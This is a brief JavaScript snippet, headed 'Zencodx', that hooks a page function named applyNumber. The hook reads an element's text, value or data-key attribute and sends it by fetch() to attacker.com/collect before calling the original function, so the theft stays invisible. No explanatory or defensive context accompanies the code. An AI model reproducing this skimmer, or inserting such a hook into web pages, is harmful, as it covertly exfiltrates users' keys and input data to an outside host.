# Zencodx
window.applyNumber = function(el) {
  const value = el.innerText || el.value || el.getAttribute('data-key') || 'UNKNOWN';

  fetch('https://attacker.com/collect?key=' + encodeURIComponent(value));

  return originalApplyNumber.call(this, el);
};
